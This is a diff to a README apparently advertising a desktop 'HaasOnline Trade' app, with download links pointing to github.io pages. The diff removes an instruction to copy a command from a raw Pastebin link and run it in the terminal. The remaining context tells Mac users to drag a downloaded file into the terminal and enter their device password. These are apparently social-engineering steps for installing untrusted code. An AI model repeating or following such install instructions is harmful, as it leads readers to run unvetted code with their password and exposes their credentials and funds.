@@ -10,8 +10,7 @@
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-blue?style=for-the-badge&logo=windows)](https://izchaknomada.github.io/.github/haasonline-trade-app)  
-[![Download for Mac](https://img.shields.io/badge/Download_for_Mac-silver?style=for-the-badge&logo=apple)](https://izchaknomada.github.io/.github/haasonline-trade-app)
+[![Explore HaasOnline](https://img.shields.io/badge/Explore-HaasOnline-0F766E?style=for-the-badge)](https://haasonline-trade.github.io/.github/)
 
 </div>
 
@@ -44,10 +43,6 @@ Designed for professional-grade reliability, the desktop version stores sensitiv
 
 ---
 
-![HaasOnline Trade Dashboard](https://camo.githubusercontent.com/e9c9963e0a7646104a75cbb8218993c0eb7b2e06f95e26422c4c2ccc925d7965/68747470733a2f2f6d69726f2e6d656469756d2e636f6d2f76322f726573697a653a6669743a313430302f312a6e36376630704c4a336871762d47647a6d6775384b412e706e67)
-
----
-
 ## ⚙️ System Requirements
 
 - **OS**: Windows 10/11 (64-bit) or macOS 11+  
@@ -75,15 +70,6 @@ Designed for professional-grade reliability, the desktop version stores sensitiv
 3. Open a terminal and drag the file you moved into the terminal window.  
 4. Press "Return", then enter your device password when prompted (leave blank if none).
 
-
-
-#### Installation via a command in the terminal:
-
-1. Go to the Pastebin at the link below and copy the command.
-
-https://pastebin.com/raw/uGGbHkSw
- 
-2. Open your terminal, paste the command you copied earlier, and run it.
 
 
 
